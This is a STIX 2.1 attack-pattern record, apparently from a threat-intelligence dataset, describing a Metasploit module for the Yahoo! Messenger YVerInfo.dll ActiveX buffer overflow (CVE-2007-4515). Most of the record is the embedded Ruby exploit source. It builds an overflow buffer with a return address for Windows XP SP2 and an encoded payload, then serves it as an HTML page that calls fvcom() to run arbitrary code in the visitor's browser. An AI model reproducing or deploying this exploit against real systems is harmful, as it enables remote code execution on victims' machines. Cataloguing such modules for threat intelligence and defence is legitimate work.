{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8dbed4a7-0c5c-47f8-af57-eda303e14855",
    "created": "2024-08-14T16:40:51.607315Z",
    "modified": "2024-08-14T16:40:51.60732Z",
    "name": "Yahoo! Messenger YVerInfo.dll ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Yahoo! Messenger ActiveX Control (YVerInfo.dll <= 2006.8.24.1). By sending an overly long string to the \"fvCom()\" method from a yahoo.com domain, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/yahoomessenger_fvcom.rb",
            "external_id": "yahoomessenger_fvcom.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4515"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=591"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yahoo! Messenger YVerInfo.dll ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Yahoo! Messenger ActiveX\n        Control (YVerInfo.dll <= 2006.8.24.1). By sending an overly long string\n        to the \"fvCom()\" method from a yahoo.com domain, an attacker may be able\n        to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-4515' ],\n          [ 'OSVDB', '37739' ],\n          [ 'BID', '25494' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=591' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP2 Pro English',     { 'Ret' => 0x7cc58fd8  } ], # Tested on fully patched XPSP2 9/29/07\n        ],\n      'DisclosureDate' => '2007-08-30',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n      false\n  end\n\n  def check_dependencies\n      use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit =  rand_text_english(411) + [target.ret].pack('V')\n    sploit << p.encoded + rand_text_english(payload.encoded.length)\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid='clsid:D5184A39-CBDF-4A4F-AC1A-7A45A852C883' id='#{vname}'></object>\n      <script language='javascript'>\n      #{strname} = new String('#{sploit}');\n      #{vname}.fvcom(#{strname});\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-08-30",
    "x_mitre_platforms": [
        "win'"
    ]
}